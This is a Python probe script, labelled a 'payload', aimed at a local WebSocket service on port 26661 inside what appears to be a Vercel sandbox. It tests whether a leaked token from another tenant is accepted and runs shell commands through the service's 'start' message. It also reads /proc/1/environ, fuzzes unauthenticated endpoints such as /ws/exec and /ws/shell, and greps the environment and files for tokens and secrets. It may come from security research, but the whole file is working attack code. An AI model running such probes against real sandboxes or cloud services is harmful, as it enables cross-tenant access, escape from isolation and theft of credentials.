# -*- coding: utf-8 -*-
"""v221 payload (guest A): 26661 深度探测 — token 交叉/ws 消息/路径模糊/进程检查
输入: /vercel/sandbox/v221_tok_a, /vercel/sandbox/v221_tok_b (驱动写入, B 的 token 模拟泄露)
输出: /vercel/sandbox/v221a.out"""
import socket, time, signal, os, base64, struct, json, threading

OUT = '/vercel/sandbox/v221a.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(170)
LOCK = threading.Lock()


def log(s, maxlen=3500):
    s = str(s)
    if len(s) > maxlen:
        s = s[:maxlen] + '...[TRUNC]'
    with LOCK:
        try:
            f.write('[%.1f] %s\n' % (time.time(), s))
            f.flush()
        except Exception:
            pass
    print(str(s)[:250], flush=True)


# ---------- mini ws 客户端 ----------
def ws_connect(path, timeout=3):
    key = base64.b64encode(os.urandom(16)).decode()
    req = ('GET %s HTTP/1.1\r\nHost: 127.0.0.1\r\nUpgrade: websocket\r\n'
           'Connection: Upgrade\r\nSec-WebSocket-Key: %s\r\nSec-WebSocket-Version: 13\r\n\r\n'
           % (path, key))
    s = socket.create_connection(('127.0.0.1', 26661), timeout=timeout)
    s.settimeout(timeout)
    s.sendall(req.encode())
    resp = b''
    while b'\r\n\r\n' not in resp:
        d = s.recv(4096)
        if not d:
            break
        resp += d
    head, _, rest = resp.partition(b'\r\n\r\n')
    first = head.split(b'\r\n')[0]
    ok = b' 101 ' in first
    return s, first.decode(errors='replace'), rest, ok


def ws_send_text(s, text):
    payload = text.encode()
    mask = os.urandom(4)
    n = len(payload)
    if n < 126:
        hdr = bytes([0x81, 0x80 | n])
    elif n < 65536:
        hdr = bytes([0x81, 0x80 | 126]) + struct.pack('>H', n)
    else:
        hdr = bytes([0x81, 0x80 | 127]) + struct.pack('>Q', n)
    masked = bytes(b ^ mask[i % 4] for i, b in enumerate(payload))
    s.sendall(hdr + mask + masked)


def ws_recv(s, timeout=3.0):
    s.settimeout(timeout)
    buf = b''
    try:
        while True:
            d = s.recv(8192)
            if not d:
                break
            buf += d
            if len(buf) > 32768:
                break
    except socket.timeout:
        pass
    except Exception as e:
        buf += ('<<ERR:%s>>' % e).encode()
    return buf


def ws_start(s, cmdline, wait=4.0):
    """发 start 消息, 返回收集的原始字节"""
    msg = json.dumps({"type": "start", "command": "sh",
                      "args": ["-c", cmdline], "env": [],
                      "cwd": "/vercel/sandbox", "cols": 120, "rows": 40})
    try:
        ws_send_text(s, msg)
    except Exception as e:
        return b'<<SEND_ERR %s>>' % str(e).encode()
    return ws_recv(s, wait)


# ---------- 主流程 ----------
def main():
    log('V221_START')
    # tcp6 记录 26661 (hex 6825) 行
    for ln in open('/proc/net/tcp6').read().splitlines()[1:]:
        p = ln.split()
        if len(p) > 9 and p[1].endswith(':6825'):
            log('T6 26661 row: uid=%s inode=%s loc=%s' % (p[7], p[9], p[1]))
    # 轮询等 token 文件 (驱动 interactive 调用后才写入)
    tok_a, tok_b = '', ''
    t0 = time.time()
    while time.time() - t0 < 80:
        try:
            ta = open('/vercel/sandbox/v221_tok_a').read().strip()
            tb = open('/vercel/sandbox/v221_tok_b').read().strip()
            if ta and tb:
                tok_a, tok_b = ta, tb
                break
        except Exception:
            pass
        time.sleep(1)
    if not tok_a or not tok_b:
        log('TOK READ FAIL a=%r b=%r' % (tok_a[:8], tok_b[:8]))
        return
    log('tok_a=%s tok_b=%s' % (tok_a[:12] + '...', tok_b[:12] + '...'))

    # 1) token 交叉 ws 升级
    for name, tok in [('tok_A', tok_a), ('tok_B', tok_b), ('tok_A2', tok_a)]:
        s, first, rest, ok = ws_connect('/ws/interactive?token=%s' % tok, timeout=3)
        log('WS %s -> %s ok=%s rest=%r' % (name, first, ok, rest[:200]))
        try:
            s.close()
        except Exception:
            pass
        time.sleep(0.4)

    # 2) ws start 消息: 看命令在哪层执行
    s, first, rest, ok = ws_connect('/ws/interactive?token=%s' % tok_a, timeout=3)
    log('WS_FULL %s ok=%s' % (first, ok))
    if ok:
        # 2a) 基本命令 + 进程树 (区分 guest / cell VM)
        out = ws_start(s, 'echo HOST=$(hostname); id; ps auxf 2>/dev/null | head -60')
        log('START_PS %d bytes: %r' % (len(out), out[:2500]))
        # 2b) 读 /proc/1 视角 (若为 cell VM 则有 containerd)
        out = ws_start(s, 'ls -la /proc/1/ 2>&1 | head -30; echo ---; cat /proc/1/cgroup 2>&1; echo ---; head -c 2000 /proc/1/environ 2>&1 | tr "\\000" "\\n" | head -40')
        log('START_PROC1 %d bytes: %r' % (len(out), out[:2500]))
        # 2c) 挂载点 (guest 有 /vercel/sandbox; cell VM 有 /var/lib/containerd)
        out = ws_start(s, 'mount 2>/dev/null | head -25; echo ---; ls /vercel/sandbox 2>&1 | head -20')
        log('START_MOUNT %d bytes: %r' % (len(out), out[:2500]))
        # 2d) 尝试直接命令 (非 sh -c)
        out = ws_start(s, 'whoami && uname -a && cat /etc/hostname', wait=3)
        log('START_WHOAMI %d bytes: %r' % (len(out), out[:1500]))
    try:
        s.close()
    except Exception:
        pass

    # 3) 不带 token 的 ws 路径模糊 (找未鉴权端点)
    paths = ['/ws/exec', '/ws/cmd', '/ws/shell', '/ws/pty', '/ws/terminal', '/ws/console',
             '/ws/fs', '/ws/upload', '/ws/download', '/ws/logs', '/ws/attach', '/ws/run',
             '/ws/start', '/ws/sandbox', '/ws/command', '/ws/api', '/ws/health',
             '/exec', '/cmd', '/run', '/start', '/api', '/api/v1', '/api/exec', '/api/cmd',
             '/sandbox', '/sandboxes', '/v1', '/v2', '/terminal', '/console', '/attach',
             '/ws', '/ws/', '/ws/interactive/', '/healthz', '/readyz', '/livez', '/debug',
             '/debug/pprof', '/debug/pprof/']
    for p in paths:
        try:
            s = socket.create_connection(('127.0.0.1', 26661), timeout=1.5)
            s.settimeout(1.0)
            s.sendall(('GET %s HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n' % p).encode())
            buf = b''
            try:
                while True:
                    d = s.recv(4096)
                    if not d:
                        break
                    buf += d
            except socket.timeout:
                pass
            s.close()
            first = buf.split(b'\r\n')[0].decode(errors='replace')
            if ' 404 ' not in first:
                log('PATH_HIT %-22s -> %s (%d bytes)' % (p, first, len(buf)))
            else:
                log('PATH %-22s -> %s' % (p, first))
        except Exception as e:
            log('PATH %-22s -> EXC %s' % (p, e))

    # 4) guest 内进程/文件检查 (interactive 是否留痕)
    log('--- ps check ---')
    os.system('ps auxf 2>/dev/null | head -50 >> %s' % OUT)
    log('--- env grep ---')
    os.system('env 2>/dev/null | grep -iE "token|key|secret|wss|interactive" >> %s' % OUT)
    log('--- /vercel/sandbox ls ---')
    os.system('ls -la /vercel/sandbox 2>&1 | head -30 >> %s' % OUT)
    log('--- find token files ---')
    os.system('grep -rlE "token|wss://" /vercel/sandbox /tmp /var/tmp 2>/dev/null | head -20 >> %s' % OUT)

    log('V221_DONE')


if __name__ == '__main__':
    main()
